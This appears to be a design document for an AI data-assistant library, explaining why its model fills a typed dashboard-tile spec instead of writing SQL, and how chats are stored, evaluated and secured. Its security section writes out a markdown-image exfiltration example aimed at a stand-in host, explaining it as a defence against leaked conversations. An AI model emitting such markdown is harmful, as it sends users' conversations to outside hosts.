## An answer is a relation and a tile, and the tile is the whole question

**The model does not write SQL. It fills a spec whose every name is an enum the page generated from
the data it shows, and the answer that spec becomes is the dashboard's own vocabulary: a relation,
and a tile on it.**

```ts
interface Answer {
  /** What is asked about: the type measured, and the hops the tile's paths take from it. */
  relation: Relation;
  /** How it is shown, and what it is narrowed to (`where`) and ranked by (`top`): the dashboard's `Tile`. */
  tile: Tile;
}
```

The tile carries the whole question because [a dashboard's tile carries its own](/docs/design/analytics#a-tile-carries-its-own-question).
So *Physics prizes by university*, added to the dashboard, is still Physics prizes by university,
where before a tile could hold neither condition nor ranking and the dashboard stored *prizes by
university*. The spec the model writes is the tile without what only the page gives it — its id and
its width — with `of`, the type it measures, and every field a path from it
([Tasks](/docs/design/tasks#a-field-is-a-path-from-what-is-measured)); `JoinResolver` makes the
relation of the paths, and the oracles are its misses and `parseTile`. The prompt lists each type's
fields once, with their kind and most common values, *gender: category (female, male)*, read from
the graph — `fieldStats` over its descriptions of the columns, the commonest values the corpus's
writer counted ([What a field is](/docs/design/fields)) — and the edges a path steps across,
rather than DDL; [Asking within a context](/docs/design/ai-context) is why once.

It replaced `answerSchema`, `checkAnswer` and `AnswerInput` (the old answer tool's schema, validator
and an answer whose relation was a key) and `answerQuery`, a second compiler of a tile to SQL beside
the dashboard's.

**It compiles with what the dashboard compiles with, and only that.** `relationQuery` makes the
relation, `JoinResolver.crossing` brings in a condition off its path, and `tileQuery` makes the query:
grouping, measure, order, `top`. The rows Ask reads and the marks the card draws come from one
function, so the sentence and the chart cannot describe two queries. All of it runs under the page's
crossfilter at the moment of asking, which is a predicate the answer is read under and never
something the model names. The card is a tile afterwards, and follows the page like any other.

**A page's clause reaches the answer as it reaches a tile.** A chip published on a relation is read by
the page's own resolver (`JoinResolver.crossing`): as it is on that relation, and on the answer's
through a semi-join on the key of a type both reach. A chip on *Physics*, published on
`LaureateAward>category>Category`, narrows `LaureateAward>university>University` by the prize, so the
University of California reads 16 and not its 43 in every category. It replaced matching a clause by
its columns alone, under which that answer kept none of its rows while the tiles beside it were
narrowed. A clause the answer's relation shares no type with keeps none of its rows, as a tile's
would (decided 11 October 2026), and is said, with the columns it names, under the tile. A clause
published on no relation is still answered by column. What would reverse it is a resolver that
crosses differently for tiles, and then the answer follows it.

*Held by* `packages/ai/src/data/page-clauses.test.ts`, "crosses a chip on another relation by the key
both reach, as the page's tiles are crossed"; "keeps none of a relation's rows when it shares no type
with the chip's".

**The card is a dashboard tile, and it takes the answer.** `AnswerCard` takes `answer` — what the
`data-answer` part holds — not an AI SDK tool part, so an answer can be drawn outside a transcript. It
draws the dashboard's own `TileView` over the tile, with two verbs that fall out of the shape:
**Filter the page to these rows** publishes one semi-join on the relation's root key over the rows
the tile reads — `tileQuery`'s narrowed relation, its conditions and its ranking in it, and for a bar
chart the categories it answered — and **Add to the dashboard** puts the tile, its conditions and its
ranking with it, in the relation's spec. A kept answer is names, not SQL, so a restored transcript
draws it again over the host's graph, and nothing a transcript carried reaches the engine as a
statement.

**The references are the semantic layer's**: Looker's Conversational Analytics and ThoughtSpot Sage,
where a question is answered by picking fields of an explore or a worksheet, and Cube, LookML and
Malloy, where SQL is compiled from a model of the data. `relationQuery`'s own page names Looker's
explore and Malloy's source, so the answer and the dashboard share a model.

**It replaced Databricks Genie's and Hex Magic's loop**: one SQL query per answer, written by the
model against DDL, behind `gateStatement`. The gate kept the engine safe and could not make the model
right: a local model shown `"cac8fcfb-…"."Person"` wrote `"Person"` in one take and
`"cac8fcfb-…"."scope"` in the next, and both were refused. A tolerant gate guessed what the model
meant, and plain names moved the mistake one step along. Every mistake of that kind is a name, and an
enum removes names from what the model writes. Genie and Hex run frontier models against names the
reader owns; a page that runs whatever model its host points it at, over names a corpus generated,
cannot count on either.

**What it costs:** a question the spec cannot say, such as a window function, a ratio of two
aggregates or a join the `JoinGraph` does not have, gets no answer: the oracles refuse every spec the
model tries, and the reader is told. No SQL tool is kept beside it: two doors are two things to
secure, and the spec is where missing words get added.

**What would reverse it:** questions readers ask and the spec cannot say, recorded often enough that
growing the spec costs more than a second door. Then a SQL tool returns beside the spec, behind
`gateStatement` as it was, with the engine loading DuckDB's `json` again (`json_serialize_sql` was the
gate's parser), and the card says which one answered.

*Held by* `packages/ai/src/data/answer.test.ts`, "reads its tile's rows with the one compiler the
dashboard's tile reads"; `packages/ai/src/data/answer-card.test.tsx`, "Add to the dashboard hands the
host its dashboards with the tile in the relation's spec, and where it landed".

## An answer is a data part, not a tool call

**Ask's transport writes the answer as a `data-answer` part of the assistant's message, and a
decision it needs from the person as a `data-ask` part; it writes no tool call.** No model called a
tool: the Task's spec was generated with `Output.object` and checked by oracles, and the transport
then wrote a `tool-input-available` *as the model would have written it*, so that `Chat`'s `tools`
renderer and an `AnswerCard` taking a tool part could draw it. A data part is the AI SDK's form for
exactly this — application data a stream writes beside the text, typed per name, reconciled by `id`
when it is written twice — and `Chat` draws it through a `data` renderer map beside `tools`. An answer
is one part written twice under one `id`: the answer as asked, then the answer read.

The reference is the AI SDK's *Streaming Custom Data*: `createUIMessageStream`'s writer writes
`{ type: "data-answer", id, data }`, and a `UIMessage` typed with its data parts carries them to
`useChat`.

**What would reverse it:** a model that answers by calling a tool — a remote model with native tool
calling, given Ask as a tool. Then the call is real, and a tool part is what it is.

*Held by* `packages/ai/src/data/ask-chat.test.ts`, "answers with the tile the Task's spec is, read on
the page's engine, and words written from its rows"; `packages/ai/src/chat.test.tsx`, "draws a data
part through the host's renderer by its name, and says when its message is written no more".

## A question to the person is the question part

**When Ask must ask — an oracle's `Decision`, options and never free text — it writes the decision as
a `data-ask` part, the host draws it with `@kanzo-tech/ui`'s question part, and the person's pick comes
back as the option's id in the reply's own `data-ask` part, `askEdit(spec, { [decision]: option })`.**
It was numbered text matched back against *1*, the option's id or its label, a second way to ask
beside the question component keasy's assistant draws with. There is one question part, in
`@kanzo-tech/ui`, and [Admission](/docs/design/admission#a-question-is-one-part-in-kanzo-techui) is why.
Since Ask's fields became paths none of its own oracles raises a decision: the tie between two paths
of one length is the model's to write
([Tasks](/docs/design/tasks#two-paths-of-one-length-are-the-models-with-the-other-on-the-chip)). The
door stays because a Task's oracle may ask. The reference is MCP's elicitation, which `Decision`
follows: a schema of options, answered by a structured reply, never parsed out of prose.

**What would reverse it:** a decision whose answer cannot be a choice, such as a threshold the person
types. Then the question part takes an input, as Questionnaire's question does, and the reply carries
the value; it is still not parsed out of text.

*Held by* `packages/ai/src/data/ask-chat.test.ts`, "asks a decision as a data part, and settles it by
the option the reply picks, not by its words".

## Whether a tile is on the dashboard is the host's spec, read

**`AnswerCard` takes the host's `Dashboards` and hands `onAdd` the whole next document, and *On the
dashboard* is the tile's id found in its relation's spec.** It is `Dashboard`'s own contract, a value
and the whole next value, and the controlled answer to a flag a card kept: that flag said *added* the
moment `onAdd` returned, before the host's save succeeded, and a remount forgot it. The tile goes on
under the answer's id, which lets the spec be asked. A write the host answers with a promise is
waited on, pending until it settles, and a rejection is drawn as a `Problem` under the tile, whole.
`onAdd` is told the relation as well as its key, because a dashboard view is driven by a `Relation`.

**What would reverse it:** a host that keeps its dashboards in a shape other than `Dashboards`. Then
the card takes a predicate and a callback that build the next spec, and the document is the host's.

*Held by* `packages/ai/src/data/answer-card.test.tsx`, "is on the dashboard while the host's spec
holds the tile, after a remount, and offered again once it is removed"; "is pending while the host's
write is, never on the dashboard before it settles, and draws a rejection as a Problem".

## An answer's verbs are on its tile, and Filter is there only when it filters

***Filter the page to these rows* and *Add to the dashboard* are icon buttons in the tile's own
header, beside its title, each named by `aria-label` and a tooltip; once the tile is on the
dashboard the second becomes *Open on the dashboard*, the host's `onOpen`.** Grafana's Explore adds a
query to a dashboard from the panel it is about and ends in *Open dashboard*; Metabase adds a
question and then opens it there. The verbs were two text buttons above the card, belonging to
nothing on screen. They go in the header's `actions` node, before the pencil. Opening is the host's
because the view is: `onOpen` is told `{ relation, key, id }`, and a host without it gets *On the
dashboard*, disabled, rather than a verb that does nothing. `actions` sits beside `onEdit`, whose
icon, label and place are the library's. *What would reverse it:* a host that wants a pencil of its
own; then `onEdit` goes and `Dashboard` passes its pencil through `actions`.

**Filter is disabled, and says *This answer keeps everything in view*, when its clause would keep
every row the page keeps.** In keasy's Ask over LDBC's social network the model answered *browsers
used, as bars, over Person* with no conditions, and pressing Filter changed nothing a reader could
see. The rule reads only what the card holds, so it costs no query: no conditions, a relation that is
a type alone, and bars over every category of their column (as many as the field's `distinct`, none
null). Disabled with its reason, not hidden, as the timeline's Play is. Its chip names what it
filters, each part read by `clauseLabel` as the filter bar reads a clause — *Ask: browserUsed · 3
selected*.

**What it costs:** `distinct` counts the whole type, so an answer read under a page that already
narrowed its column answers fewer categories than the field has, and its Filter stays enabled even
when it would keep what the page keeps. **What would reverse it:** readers pressing an enabled Filter
that changes nothing. Then the card counts the page's rows with and without the clause, one query per
answer, and disables on equal counts.

*Held by* `packages/ai/src/data/answer-card.test.tsx`, "draws its verbs in the tile's header, beside
its title"; "opens the tile on the dashboard once it is there, when the host says how"; "is disabled,
and says why, when its clause would keep everything in view"; "filters when the bars are ranked down
to some categories, or cross a hop"; "names the chip after what it filters, as the filter bar reads
each clause".

## Which relations are offered

**Ask is offered the types alone, as the graph describes them, and the relation is the paths the
model writes from them.** An answer across a hop is still answered: a path steps across it, and a
step's fields are the type's. A multi-valued property is reached the same way and is never a type Ask
measures on its own. Nothing is read from the engine to offer them: each type's fields, kinds and
commonest values are on the join graph, counted by the corpus's writer
([What a field is](/docs/design/fields#what-a-field-holds-comes-from-counts-stated-in-the-corpus)).

It replaced `readAnswerRelations`, a `SUMMARIZE` per relation and a count per category queued on the
page's one connection ahead of its charts. Measured 2026-10 in DuckDB-WASM's Node build over a graph
shaped like LDBC's social network at scale 1 (3.2 M vertices, 17 M edges, 8 types, 23 edges), that
read took 1.2 s for the types alone and 41.5 s with every hop, and the prompt was 3,581 characters
for the types and 39,018 with every hop. Offering every hop had already gone before the read did:
keasy's first evaluation pass found the model choosing a relation wrongly.

**What would reverse it:** a spec whose fields the type alone cannot give, such as an edge's own
property. Then that edge's columns are described on the graph beside the types', and its fields
join the spec's enum under its path. And a graph whose corpus counted nothing offers fields without
values; if that became the common case, the counts would be read once per corpus through the read
door, never once per prompt.

*Held by* `packages/ai/src/data/answer.test.ts`, "describes a relation's fields from the graph,
without its steps' keys, each with the commonest values its writer counted"; "reads nothing from the
engine: what a field is and holds is the graph's"; `packages/ai/src/data/ask.test.ts`, "is a path Ask
may write and read its value by, and never a type it measures".

## An answer's rows are on the page, as a table

**`AnswerCard` holds the rows the answer was read from as a visually hidden table, captioned *The
rows the answer was read from*.** A chart's long description is its data, best structured as a
table on the same page — the W3C WAI Images Tutorial's [*Complex
Images*](https://www.w3.org/WAI/tutorials/images/complex/) — and Highcharts' accessibility module
keeps such a table for screen readers in the same way. The rows are the read's as the engine
returned them under the page's filter when the call ran, capped as the model's are; the tile above
follows the page afterwards and may no longer show them, which the caption's words make plain.

The same table is what a test proves an answer by: `AnswerHarness.rows()` reads it by its caption,
cell by cell. A figure asserted there is the engine's; asserted in the chart it is only drawn, and in
the reply it is only the model's quotation of it — on a replayed take, a recording's.

## A chat is kept in the AI SDK's shape

**`@kanzo-tech/ai` keeps a chat as the AI SDK keeps one — the `UIMessage[]` of a chat id — and the
host gives two functions, `load(id)` and `save(id, messages)`, and may give a third, `keep`, which
decides what of each part is stored.** A chat hook given them (`useAgentChat`, `useAskChat`) calls
`load` once before the first turn, validates what it answers with the AI SDK's `validateUIMessages`
against the chat's own `dataPartSchemas` and `messageMetadataSchema` — the ones `useChat` already
takes — and, for an agent, its tools, and makes the `useChat` of that `id` from them; at the end of
every turn it saves every message, one save at a time. `keep` filters or rewrites the parts (a host drops
reasoning, say), and what it keeps is validated before `save` is called, so a `keep` that writes what
cannot be read back is refused when it writes, not when the person comes back.

The load is a plain call, not a query: the chat hooks are the root, which takes no TanStack peer
([One read per datum](/docs/design/reads)), and a kept chat is read once, into `useChat`, which holds
it. The reference is the AI SDK's *Chatbot Message Persistence*: a chat is its id and its
`UIMessage[]`, saved when a response finishes and validated on the way back in because what was
stored is untrusted input. Two things are its rules: a list with no message, or a message with no
part, does not validate, so `[]` from `load` is a chat never saved.

**Ask's parts have schemas of their own**, which `useAskChat` passes as its `dataPartSchemas`: an
`answer` and an `ask` part are each rebuilt from the fields they may hold, their relation read as
`{ root, path }` and their tile through `parseTile`, the dashboard's own reading of a stored tile —
so what a transcript carried back is names over the host's graph and never reaches the engine as a
statement. They are written by hand as Standard Schema, which the AI SDK takes, because
`@kanzo-tech/ai` has no schema library of its own and `parseTile` already is the tile's.
*What would reverse it:* a schema library entering `@kanzo-tech/ai` for another reason; then the
parts are written in it.

*Held by* `packages/ai/src/data/ask-parts.test.ts`, "reads back an answer and its turn as Ask wrote
them, and nothing they do not hold"; "refuses an answer whose tile a dashboard would not read, or
whose relation is not one".

**A stored Ask chat holds structure, and the person's data is not in it.** `useAskChat`'s default
`keep` empties an answer's rows and keeps its spec and its tile: the question, the relation as
`{ root, path }`, the tile through `parseTile`. The rows are re-derivable, since the card reads them
again through `readAnswerQuery` over the host's graph, so a stored chat that held them was a second
copy of the data in a store the library does not know, under an authorisation story the host wrote
for conversations and not for rows. A host that wants offline transcripts with data passes a `keep`
that keeps them; the default is the one that cannot leak. The reference is the AI SDK's persistence
guide, which stores whole `UIMessage`s: the rule follows it for every part but this one.

**What would reverse it:** a host whose transcript must read without the graph attached. Then it
passes the `keep` that keeps rows, and the default stays.

*To be added:* a test that a message saved by the default `keep` has no row in any part.

**`useKeptChat` is the same thing for a transcript whose messages are not `useChat`'s.** Keasy's
assistant, which wrote the store, queue and restore this replaces, is a guided conversation whose
turns the product decides and whose messages it writes itself; the chat hooks are this one with
`useChat` around it, so there is one mechanism and two ways in only where there are two kinds of
transcript. *What would reverse it:* the guided conversation moving onto `useChat`; then
`useKeptChat` has no caller and leaves the barrel.

**A stored chat that does not validate is a failure, handed to the host whole**, as every other
([failure](/docs/design/failure)): `chat.kept` is `failed` with what was thrown, `Chat` says so with
its composer inert, and nothing is saved over it. The library never drops the messages it cannot
read and opens an empty chat in their place, which would lose a person's conversation without saying
so. A save refused is `unsaved`, said under the transcript, and the next turn's save is tried all
the same. While the chat is read, `Chat` is its own skeleton: a question sent then would be lost
under the messages that arrive.

**What would reverse it:** a host that stores something other than the messages — an event log, a
server-side thread — and rebuilds messages from it. Then `load` and `save` still have this shape, and
the conversion is the host's.

*Held by* `packages/ai/src/kept-chat.test.tsx`, "opens where it stood: the chat of its id is read
once, validated, and drawn"; "never opens empty in place of a chat it cannot read, and never saves
over it"; "saves one at a time, in order, and refuses what keep left unreadable".

## The model is open, and where it runs is not the library's to enforce

**`Assist`, `Chat`, `runTask` and `useAskChat` take the AI SDK's `LanguageModel` as it is. The library
has no notion of a local model, no `requireLocal` and no locality badge, and remote models are a
non-goal: nothing here is designed for one.** The shipped path is `localModel`, in the page, served
from the host's origin ([Tasks](/docs/design/tasks#the-premise-a-small-model-in-the-browser)). A host
that passes a gateway model gets it to run and gets neither help nor a promise. *Nothing about a
question leaves the browser* is a property of a host's composition (keasy serves the weights itself
and its `connect-src` allows nothing else), not of this library, and no page says it of the library.

**Why not enforce it.** The only locality a page can hold is the browser's: a CSP whose `connect-src`
names the origin. A flag in JavaScript is a convention: `localModel().provider` is `"kanzo-local"`,
and any wrapper can claim it or hide it. A `requireLocal` defaulting to true is one prop from
disabled, to a state indistinguishable from never having had it, and makes `ai` decide for every
host what a model is.

**The failure it would defend against.** Ask's prompt lists up to six distinct values for each field of
each type it offers, and the previous spec (`packages/ai/src/data/ask.ts`); `Assist` sends the field's
value, its description and the host's whole-form `context` (`packages/ai/src/proposals.ts`). With a
remote model all of it leaves the page. The fixes that do not depend on where the model runs are in
the next section and hold for any model.

**What a remote model would also need.** Ask's schema carries `minimum` and `maximum` (`top`),
`minItems: 2, maxItems: 2` (`between`) and keys that are not `required`. OpenAI's structured outputs
require every key in `required` and an object at the root; Anthropic's reject numerical constraints
and array constraints beyond `minItems` of 0 or 1 with a 400 (both pages read, 2026-10). The schema
is written for XGrammar, which accepts all of it, and is projected for no other decoder.

**What would reverse it** is the first remote model a host asks to be supported, and then a work
list, in order, none of it started: a schema profile per decoder, written once and projected by one
function, with `validate` keeping the constraints a decoder drops; the request's deadline and limits
in `llm`'s one door and not above ([failure](/docs/design/failure#a-models-failure-is-shown-once-on-the-first-attempt));
the credential's route from `auth`'s `fetch`, for which no seam exists and none should be drawn
before; and a marker for locality, decided then with the evidence of what a host used it for.

## What a person typed and a store held leave by no default path

Four defaults, each independent of the model. OWASP's list for LLM applications names the classes
they answer: Sensitive Information Disclosure (LLM02), Improper Output Handling (LLM05) and Excessive
Agency (LLM06). Only the titles of its 2025 edition were read, not its mitigations.

**`Assist` ignores a sensitive control.** A wrapped `type="password"` input, or one whose
`autocomplete` is `current-password`, `new-password`, `one-time-code` or a `cc-*` token (the HTML
Standard's autofill names, not re-read here), gets no ghost text, no candidates, no listener and no
request: `Assist` renders its child as it was. It took the first non-hidden `input` under it, so a
password field's value was interpolated into the continuation prompt. The library reads one control,
the one it wraps; the whole-form `context` is what the host passes, and its documentation says so.

**An `AssistEvent` carries no value.** Its `kind`, the field's accessible name, the Task and the
attempt count are what a host that learns from the lifecycle needs, with the proposal's length. The
text was never needed: an accepted one is in the field the host already owns. A host that forwarded
events to a server was forwarding every shown suggestion.

**A model's markdown loads nothing and links only where it may.** `MessageMarkdown` sets Streamdown's
hardening to no remote image (`allowedImagePrefixes` empty, `allowDataImages` false) and links and
protocols to `https:` and `mailto:`; a host reopens them through the props it already passes on.
Streamdown 2.5.0's defaults, read in its built output, are `"*"` for image prefixes, link prefixes and
protocols, with data images allowed. The route this closes is text writing `![x](https://host.example/?d=…)`:
the browser fetches the URL with the conversation in it. Ask's replies are a template over rows and
cannot do it; `Chat` over `useAgentChat` can. No source on the technique was fetched; the reason is
the mechanism. The docblock in `markdown.tsx` that describes an optional `@kanzo-tech/ai/markdown`
entry the package no longer has is wrong and goes with it.

**Approval is the host's.** `useAgentChat` carries any tool set, and `approval-requested` is drawn as
*Awaiting approval* with no component that answers it. Tasks use no tools. A component to approve is
admitted with its second call site, as `Confirmation` was refused
([Admission](/docs/design/admission)).

**What would reverse it:** a host that needs a remote image in an answer (a map tile), which passes
the prefix; a field where a model's help on a credential is wanted, which would be an opt-in prop on
`Assist`, never a deny-list that forgot a token.

*To be added, and not cited as held until they exist:* `assist.test.tsx`, "does nothing on a password
field and sends no prompt" and "reports an event with no value in it"; `markdown.test.tsx`, "renders
no image for a remote URL and no link outside https and mailto".

## A call has settings, and a wait has a bound

**`stream` and `generate` take the AI SDK's call settings under its names (`temperature`, `seed`,
`maxOutputTokens`, `stopSequences`), a Task takes the same in `runTask`'s options, and `Generated`
carries the `finishReason` the SDK reports.** The doors took `model`, `system`, `prompt`, `output` and
a signal, so a measurement of the model measured the provider's defaults, and a Task could not say
how much it would let a model write. The defaults stay the provider's; the library chooses no
temperature for a host. What it does is record: an evaluation pins the settings and logs them.

**A seed is passed and not promised.** That WebLLM honours `seed` on WebGPU is not established here,
so no claim of reproducibility rests on it, and the evaluation measures the spread across epochs
instead of assuming it is zero. Only the model double is deterministic by construction.

**The model's load and a generation are bounded on silence, by the one `within`.** The waits and why
they are bounds on silence are on [the failure page](/docs/design/failure#the-waits-it-bounds); this
page's part is the queue. `localModel` serialises calls on one engine, so a dead generation held the
turn for Ask, `Assist` and the starters together with *Stop* as the only exit. A silent turn is freed
as `llm/silent`, the next call runs, and a Task does not repair it
([Tasks](/docs/design/tasks#repair-is-bounded-and-reads-how-a-generation-ended)): a model that made no
progress will not on a second asking. The progress the bound reads is the engine's own report of a
token and of a shard, which `loadLocalModel` already publishes as `ModelLoad`; a bound on silence is
that one `within` armed again on each report, so there is still one clock.

**What would reverse it:** a seed WebLLM does not honour with a spread too wide to compare runs; the
settings stay and the evaluation's claim narrows to the double. A device that legitimately stays
silent past the bound, measured: the figure moves, not the rule.

*To be added:* `stream.test.ts` and `generate.test.ts`, "hand the call settings to the model";
`local.test.ts`, "frees the turn of a generation that made no progress, as llm/silent".

## Ask is evaluated as a dataset, a solver and a scorer

**`packages/ai/eval` is three parts that change independently and a log that records enough to repeat
a run.** The vocabulary is Inspect's, from the UK AI Security Institute: an evaluation brings
together a dataset of inputs and targets, a solver and a scorer (the page was read; what it says of
repetitions and of its log was not). Nothing named Inspect is imported, since it is Python, and its
*Task* is not ours. Today `ask.eval.ts` is runner, cases, scorer and results in one, run by hand in a
Chromium with WebGPU ([Testing](/docs/design/testing#asks-evaluation-set-lives-beside-ask)),
recording none of the settings, with no baseline. So *the linker is the budget* and *the model writes
paths well* are unfalsified claims: there is no number.

| Part | Is | Changes when |
| --- | --- | --- |
| Dataset | `cases.ts`: a page's relation and filter, the questions in turn, the rows the last answer must and must not have been read from | a failure a reader hits becomes a case |
| Solver | `solve(case, model)`: Ask's Task and the answer read, over the page's engine, returning rows | the model, prompt or oracles change |
| Scorer | `score(case, rows)`: execution accuracy, a pure function | the metric changes |
| Log | a line per case per epoch: model id, digest of the served `app-config.json`, settings, epoch, the Task's attempts and finish reasons, `kanzo:llm:*` marks, verdict and why | never in place; lines are appended |

**Two solvers, one dataset.** The browser's exists: `localModel` in a worker, kept for what only
WebGPU shows. The second is Node: the same Task over an AI SDK model talking to a native llama.cpp
server, on the DuckDB double of `@kanzo-tech/testing`; llama.cpp's JSON-schema decoder with `$defs`
and `$ref` was checked on 2026-10-10 ([Asking within a context](/docs/design/ai-context)). It is the
CI evaluation [Tasks](/docs/design/tasks#everything-in-the-browser-the-model-too) planned, **and a
proxy**: the browser serves MLC-compiled weights and the server GGUF ones, the same family and
nominally the same quantisation and not the same bytes. It catches a regression in the prompt,
schema or oracles; the number for a model on a device is the browser run, by hand, before a change
to Ask or to the model. The Node solver is also the first reader of `@kanzo-tech/ai/data` without a
DOM: if its closure does not load there, [the packaging rule's](/docs/design/architecture#packaging-follows-the-entry)
reversal applies and the headless core is a package.

**A baseline is a file, and a threshold comes after it.** The first complete run on a machine with a
GPU is committed as data: per case, the fraction of epochs that passed, with model, digest and
settings. Later runs are compared to it. No threshold is written before the spread across epochs
exists; the gate is then *below the baseline by more than the spread*, never an accuracy chosen in
advance. What accuracy makes Ask shippable, and on which model, is the owner's and stays open until
there is a number to put it against.

**What would reverse it:** the Node run disagreeing with the browser's on the same cases by more than
the spread, which makes CI advisory and not a gate; a second product's cases, which make the runner
the shared part and each product's cases its own.

*To be added:* a test that the scorer reads a recorded set of rows to today's verdicts, and that a
log line holds every field above.

## Chat, Ask and Assist are checked by rule and by keyboard

**WCAG 2.2 AA is what the drawn parts — the transcript, the composer, the answer card, `Assist`'s ghost
text and candidates — are held to, and an answer's chart has a text alternative that is its rows.**
The roles are there: `role="log"` on the conversation, `Working` as a `role="status"`, an `aria-live`
status in `Assist`, the hidden table in `AnswerCard`
([above](#an-answers-rows-are-on-the-page-as-a-table)). No rule-based run is: no package declares
`axe-core` or a wrapper (a search of the manifests found none), so an attribute wrong in a way
nobody thought to assert passes.

To be added: an axe-core run over `Chat` empty, streaming, failed and with a kept chat that failed;
`AnswerCard` with Filter enabled and disabled; `Assist` with ghost text and with candidates; a
keyboard test for each key the page names (Tab, Esc, Alt+]); and `prefers-reduced-motion` held as
the appearance guards hold the rest, a guard that fails an animation class in `ai/src` without its
`motion-reduce` counterpart.

**What no rule here proves.** Contrast needs layout and is not judged in a DOM emulation; it is read
in the browser run. A rule finds the failures it has a rule for. Whether a screen reader announces a
streaming answer usefully, rather than every token, is tested by nothing and not known here;
`role="log"` is the pattern the reference prescribes, and the claim stops there.

**What would reverse it:** a rule that fails a pattern the reference itself prescribes. It is
suppressed with the clause beside it, not removed.

## Production-grade axes

| Axis | What this page commits to |
| --- | --- |
| Failure and recovery | A silent load or generation frees the turn; a truncation is repaired once; a stored chat that cannot be read is a failure shown, never an empty chat |
| Security and privacy | No password or one-time-code control is read; no value in an event; no remote image by default; no rows in a stored Ask chat; locality is the host's CSP, stated and not simulated |
| Performance and size | Streamdown (128 kB brotli by the source's own comment) is a dependency of the root and is not in the root's gauge; whether an `Assist`-only host drops it is not measured |
| Stable API, accessibility, tests | One door for call settings; WCAG 2.2 AA for what is drawn, with the checks above to be added; an evaluation with a log and a baseline |

## Breaking, in the consumer's words

- `Assist` does nothing on a password, one-time-code or `cc-*` field; wrap another control.
- `AssistEvent` has no `proposal`; it carries the proposal's length. Read the text from the field.
- `MessageMarkdown` loads no remote image and links only to `https:` and `mailto:`; pass the
  hardening props to reopen either.
- `useAskChat` stores an answer without its rows; pass a `keep` that keeps them to store them.
- `stream` and `generate` take `temperature`, `seed`, `maxOutputTokens` and `stopSequences`;
  `generate` returns `finishReason`.
- A model that makes no progress rejects as `llm/silent`, and its turn is free.
